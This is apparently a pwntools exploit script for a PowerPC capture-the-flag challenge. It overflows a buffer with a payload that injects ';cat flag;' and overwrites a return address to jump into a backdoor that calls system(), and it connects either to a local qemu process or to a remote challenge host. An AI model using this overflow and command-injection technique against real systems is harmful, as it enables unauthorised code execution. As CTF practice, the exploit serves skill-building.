from pwn import * 
from pwn import p32


debug = 1
gdb_is = 1
# context(arch='i386',os = 'linux', log_level='DEBUG')
context(arch='powerpc',os = 'linux', log_level='DEBUG')
if debug:
    context.terminal = ['/mnt/c/Users/sagiriking/AppData/Local/Microsoft/WindowsApps/wt.exe','nt','Ubuntu','-c']
    # r = process("./pwn")
    # r = process(["qemu-ppc","./pwn"])
    r = process(["qemu-ppc", "-g", "12345", "./pwn1"])
else:
    host = "114.117.183.70"
    r = connect(host,9999)#远程连接
    gdb_is =0
    

if gdb_is:
    # gdb.attach(r,'b* 0x1000085C')
    gdb.attach(r,'target remote localhost:12345')
    pause()
    pass

# libc = ELF('./libc-2.31.so')
elf = ELF('./pwn')
system_addr =0x10008290
backdoor = 0x10000624
shell = 0x10000694 #在backdoor中跳过了栈的初始化，即还是原来的栈！！！ 然后直接到system
payload = b'A' *30 +b';'+b'cat flag'+b';'+ p32(shell)
#         30试出来


r.sendafter(b'comment.\n',payload)
r.interactive()


